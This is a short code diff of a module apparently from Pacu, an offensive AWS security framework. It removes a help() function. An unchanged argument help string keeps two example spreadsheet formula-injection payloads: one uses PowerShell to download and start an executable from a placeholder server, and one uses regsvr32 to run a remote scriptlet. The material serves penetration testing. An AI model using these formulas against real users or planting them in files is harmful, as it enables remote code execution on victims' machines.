@@ -34,10 +34,6 @@ parser.add_argument('--regions', required=False, default=None, help='A comma-sep
 parser.add_argument('--payload', required=True, help='The formula payload to use. Some examples:\n This formula uses PowerShell to contact an external server to download and execute a binary file: =cmd|\' /C powershell Invoke-WebRequest "http://your-server.com/test.exe" -OutFile "$env:Temp\\shell.exe"; Start-Process "$env:Temp\\shell.exe"\'!A1\nThis formula contacts a remote server to download and execute a .sct file: =MSEXCEL|\'\\..\\..\\..\\Windows\\System32\\regsvr32 /s /n /u /i:http://your-server.com/SCTLauncher.sct scrobj.dll\'!\'\'')
 
 
-def help():
-    return [module_info, parser.format_help()]
-
-
 def main(args, pacu_main):
     ###### Don't modify these. They can be removed if you are not using the function.
     args = parser.parse_args(args)
